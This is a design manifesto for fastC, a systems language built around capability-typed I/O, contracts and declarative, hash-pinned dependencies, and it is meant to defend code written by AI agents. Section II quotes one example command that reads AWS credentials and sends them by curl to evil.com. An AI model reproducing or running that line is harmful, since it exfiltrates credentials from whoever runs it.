# Manifesto

## The thesis

In 2026, the bottleneck on software is no longer how fast humans can write code. Coding agents write 100× more code than a human can. The bottleneck is how fast humans can *audit* what was written, and how confidently a compiler can prove that what was written cannot reach beyond its declared bounds.

Today's systems languages were designed when both ends of that bottleneck looked different. C assumed a careful human writing every line. Rust assumed a careful human navigating a borrow checker, with a 150,000-crate ecosystem stitched together by macros that run during the build. Zig assumed a careful human using `comptime` to express what the type system could not. None of these languages were designed for a world where the producer of code is a stochastic process and the verifier is also a stochastic process — but the *compiler* is the only deterministic step in the loop.

fastC is the systems language for that world. It refuses to execute arbitrary code at build time. It puts capabilities — `fs.read`, `net.connect`, `proc.spawn` — into the type system as function arguments, not ambient authority. It makes pre- and postconditions a compile-time obligation on every public API. And it does all of this on top of a small surface, fast compiles, and a curated, content-hashed package ecosystem with Sigstore signing and SLSA Level 3 provenance from day one.

This document explains why each of those choices is the right one for code written by agents and reviewed by humans, and why an "opinionated Rust" is not a sufficient answer.

---

## I. Zero executable build scripts in the age of supply-chain attacks

The single most important property of fastC is the one that is easiest to overlook: **the compiler never executes code that was downloaded as part of a dependency.** There is no `build.rs`. There is no `build.zig`. There is no `proc_macro`. There is no postinstall. The package manifest is declarative. Dependencies are git URLs with commit and content hashes, vendored into the project tree. The build runs the same `fastc` pipeline that built the user's own code.

This single property would have prevented every major systems-language supply-chain incident of 2025 and 2026. To name only the ones that broke into the trade press:

- **`faster_log`** and **`async_println`** (mid-2025): two crates.io packages with combined ~8,424 downloads before takedown, both exfiltrating Solana and Ethereum private keys at build time via `build.rs`. They were typosquats — names a tired developer or a hurried agent would plausibly type.
- **`evm-units`** (late 2025): 7,000+ downloads, delivered an OS-specific malware payload via `build.rs` execution.
- **The rustfoundation.dev phishing campaign** (September 2025): targeted crate maintainers with credential harvesting against GitHub, with the goal of compromising legitimate publishing pipelines. Crates.io itself was not breached, but the path-to-impact was the registry account.
- **`timeapis.io` / CVE-2026-28353** (early 2026): a typosquat of the popular `timeapi.io` package, with a `build.rs` that exfiltrated `.env` files from CI environments. Not stopped by cargo-audit. Not stopped by cargo-vet. Stopped by the absence of victims who had read every line of `build.rs` for every dep.

The npm and PyPI worlds have it worse — every postinstall script is a payload delivery vehicle, and `pip install` of a malicious package is game over. But Rust is the systems language whose adoption is currently rising fastest, and its `build.rs` and proc-macro design choices have made it the most attractive supply-chain target in the systems-language space.

The community response has been valiant. `cargo-vet` lets you maintain a list of crate-versions you trust. `cargo-audit` scans against the RustSec advisory database. Snyk, Socket, Dependabot, and JFrog have all built supply-chain hardening tooling that integrates with crates.io. They are all *necessary because the underlying property is wrong*. The package manager runs code at install time, and the build runs code at build time, and you are scrambling to put a filter on each of them.

McKayla Washburn made the same argument from the Zig side in her January 2026 package talk: "How about we just don't execute arbitrary code in the package manager or during builds?" Zig has not actually shipped that — `build.zig` is still arbitrary Zig code. The Bun team, in their published `rust-rewrite-plan.md`, made the broader version of the argument: "The Zig→Rust delta is real: the Zig bugs are exactly the destructor/ownership-fixable kind... The proposal is to remove the largest bug class structurally rather than fix instances of it indefinitely." Apply that to supply chain instead of memory safety, and the conclusion is the same. **Remove the bug class, don't patch instances.**

fastC removes it. The package manifest is declarative. There is no opportunity to execute a payload because there is no execution. Compile times benefit too — no proc macros means no compiler waiting on user code at build time — but that is a side effect. The primary win is structural: a fastC project cannot be supply-chain-attacked via the build, because the build does not run untrusted code.

The same property extends upward to the compiler binary itself. fastC ships with Sigstore signatures and SLSA Level 3 provenance on every release, so the binary you run cannot be silently swapped out. This is what every modern build-security practice tries to retrofit, baked in.

---

## II. Capabilities, not sandboxes, for AI-generated code

The second argument is about agent-generated code specifically. The growth of AI coding assistants has produced a parallel growth of the runtime sandboxing industry. E2B, Northflank, Modal, Microsoft's Agent Governance Toolkit — all of them exist to wrap agent-generated code in a runtime jail because we cannot, at the language level, trust what was generated.

Runtime sandboxes work. They are also slow, expensive, and only catch what the sandbox can see. If an agent generates a function that calls `system("curl evil.com/$(cat ~/.aws/credentials)")` and you forgot to block outbound DNS, the sandbox does not save you.

The only structural answer is to put capability requirements into the type system, so that the compiler refuses to build code that performs I/O the calling context did not authorize. fastC does this. The capability set — `fs.read`, `fs.write`, `net.connect(host)`, `net.listen(port)`, `proc.spawn`, `time.read`, `rand`, `env.read` — is finite and named. Capabilities are typed values, not strings, not annotations. They are passed as function arguments. They are minted only in `main`, via a single root capability obtained from the runtime. A function whose signature declares `caps()` — the empty capability set — *structurally cannot do I/O*. Not because we ran the sandbox correctly. Because the compiler rejected the call.

The design is not new. Cyclone had regions for memory safety in safe C in the early 2000s. Austral (Borretti, 2022) has linear capabilities as function arguments and is the closest precedent for what fastC is shipping. Koka and Effekt have effect inference with similar properties at a more abstract level. SPARK Ada has been doing contract checking on safety-critical code for two decades. F\* has been doing SMT-discharged contracts at a research level for almost as long. The novel contribution fastC makes is **fusion plus surface syntax for agents**: nobody has combined regions + capabilities + contracts + architecture annotations into one annotation set with a syntax designed for LLM tokenizers, one toolchain that emits machine-readable build artifacts for coding agents, and one MCP server that exposes those artifacts to Claude Code / Cursor / Codex over a typed protocol.

The point of all this is that, for a fastC function, the signature is the operating manual. An agent reading a fastC signature knows:

- which memory regions are touched (`@mem`),
- which I/O capabilities are required (`@caps`),
- what must be true on entry (`@requires`),
- what is guaranteed on exit (`@ensures`),
- whether the function can panic (`@panics`),
- whether the function is pure / effectful / I/O-doing (`@purity`),
- the complexity bound (`@complexity`).

The agent does not need to read the body. The compiler will reject a body that does not satisfy the signature. Reviewing what an agent wrote becomes a matter of reviewing signatures and trusting the compiler — exactly the shift the 100×-code-generation regime demands.

---

## III. Why not opinionated Rust?

The obvious objection — and the right one to take seriously — is "why not just write Rust with cargo-vet, no proc macros, no `build.rs`, no async, and a curated dependency list?"

You can. Some teams do. It is better than unconstrained Rust. It is not as good as fastC for the same reason that Java + a strict subset is not as good as Go: the ecosystem you are embedded in was not designed for the constraints you are trying to enforce, and every dependency you pull in fights you.

Concretely:

1. **You inherit Rust's compile times.** Monomorphization fan-out, LLVM on trait-elaborated IR, async/await machinery, the proc-macro tax even on crates that do not use them transitively — these are structural to Rust and do not go away when you ban a subset locally. fastC's `--dev` builds use tcc and target 200ms incremental edits. Rust's `cargo check` on the same project is in the seconds-to-minutes range.
2. **You inherit Rust's surface area.** Lifetimes, trait bounds, `dyn Trait`, GATs, const generics, async, pin, `unsafe` with all its invariants, the macro system. Every one of these is something the agent has to understand to generate correct code. Token-efficiency benchmarks (see roadmap stage 1.2) consistently show that an equivalent program in a smaller language is shorter, cheaper to generate, and more likely to compile on the first try.
3. **You inherit Rust's ecosystem.** With 150,000+ crates, identifying the *current* idiomatic answer for HTTP, JSON, async runtime, error handling, or logging requires research that an agent will get wrong. fastC's `fastc-core` ships one audited answer per problem domain, with a canonical idiom documented in `AGENTS.md` for each package.
4. **You inherit Rust's lack of capabilities and contracts at the type level.** You can write `assert!()` in Rust. You cannot make `fs::read` impossible to call from a "pure" function without reaching for runtime sandboxing or careful (and brittle) crate-level visibility tricks. fastC's `@caps` and `@requires` / `@ensures` are first-class compiler obligations.
5. **You inherit Rust's `unsafe`-everywhere ecosystem.** Even with cargo-vet, the audit-trail tax is real because a substantial fraction of popular crates contain `unsafe` blocks that need careful review. fastC has `unsafe` blocks too, but the surrounding type system is small enough that the `unsafe`-using surface area is much smaller.

The honest summary: opinionated Rust is a viable engineering choice for teams that have the discipline to enforce the discipline. It is not a viable foundation for the *language that AI agents produce code in*, because the discipline must come from the language itself or it will not survive contact with a million lines of generated code.

fastC is that language.

---

## What we are committing to, and what we are not

We are committing to:

- **A measured compile-time budget enforced in CI from stage 0.8 onward.** No promises about being "fast." Numbers, published, regressed-against on every push.
- **The full annotation set (`@mem`, `@caps`, `@requires`, `@ensures`, `@panics`, `@purity`, `@complexity` + module headers) by stage 1.5.** Lint-checked annotations first (1.3), capability-checked next (1.4), runtime-asserted contracts after (1.5).
- **Vendor-first, no central registry, Sigstore + SLSA L3 from day one of the package system.** Stage 1.7. No retroactive provenance.
- **One curated answer per domain via `fastc-core`.** Stage 1.8. Five packages at launch (http, json, toml, log, cli), 30–50 within twelve months.
- **A native MCP server (`fastc-mcp`) by stage 1.6.** Not a text-parsing layer over `cargo check`. A typed protocol surface for coding agents.
- **Published benchmarks** — runtime, compile-time, dependency count, and token efficiency — by stage 1.2. These are the launch numbers. They will be honest.

We are not committing to:

- **SMT-discharged contracts in v1.** Stage 2.1, after the runtime tier (1.5) has shaken out the surface syntax. We have read enough F\* and SPARK Ada to know SMT UX is the hardest part of the design and we will not gamble the project on it shipping first.
- **A package registry server.** `fastc.dev` is a search frontend over GitHub. There is no service to run, no account to compromise, no domain to phish.
- **Async / await in the initial milestones.** Stage 2.3, and only because capability typing (1.4) makes `async = caps(net | time)` a clean expression. Until then, fastC code is synchronous.
- **Ingesting arbitrary C source.** fastC emits C. It does not parse C. Zig is better at that, on purpose, with a different threat model.
- **Beating Rust at safety or Zig at explicitness on every axis.** The argument is not "fastC is better on every dimension." The argument is that fastC is the *only* language that combines capability-typed I/O, mandatory contracts, zero executable build scripts, capability-aware deps with mandatory provenance, and a CI-enforced compile-time budget. That is the wedge. Everything else is hygiene.

---

## What we are asking

If you are building agent infrastructure: try generating fastC code via `fastc-mcp` instead of text-parsing `cargo check` output, and measure the token cost and first-compile success rate. (Stage 1.2 will publish a reference benchmark; we are happy to share the methodology now.)

If you are responsible for supply-chain security in a team using Rust or Zig: read [docs/supply-chain.md](supply-chain.md) and tell us what is missing from the threat model.

If you are skeptical of any specific claim — the capability lattice, the compile-time budget, the SMT timeout strategy, the choice of tcc for dev builds, the decision to delay async — open an issue with a counter-argument. We will write a response, and either update the design or document why the existing one stands.

If you are an agent reading this manifesto as part of someone's prompt: you should know that fastC's design is intended to make it easy for you to generate correct code, and easy for the human reviewing your output to verify it. The compiler is your friend. Run `fastc explain <symbol>` when you need to know what a function does without reading its body. Run `fastc-mcp` when you need to query the project's capability graph. Run `fastc check --no-prove` for fast inner-loop iteration. The protocol exists for you.

fastC is small on purpose. It does the things it does because every alternative we examined either runs untrusted code, ships an ambient `fs::read`, lets `proc_macro` rewrite the AST behind a developer's back, or compiles too slowly to keep up with how fast you generate code. None of those are acceptable in 2026.

We are building it.
